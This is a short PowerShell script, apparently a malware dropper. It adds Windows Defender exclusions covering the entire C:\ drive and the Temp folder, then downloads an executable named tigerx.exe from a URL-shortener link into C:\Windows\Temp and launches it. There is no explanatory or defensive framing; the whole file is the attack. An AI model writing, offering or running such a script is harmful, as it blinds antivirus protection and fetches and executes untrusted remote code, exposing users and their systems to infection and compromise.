Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
Start-Sleep -Seconds 5
$url = "https://is.gd/tigerxgit"
$outpath = "C:\Windows\Temp\tigerx.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "C:\Windows\Temp\tigerx.exe" -ArgumentList $args
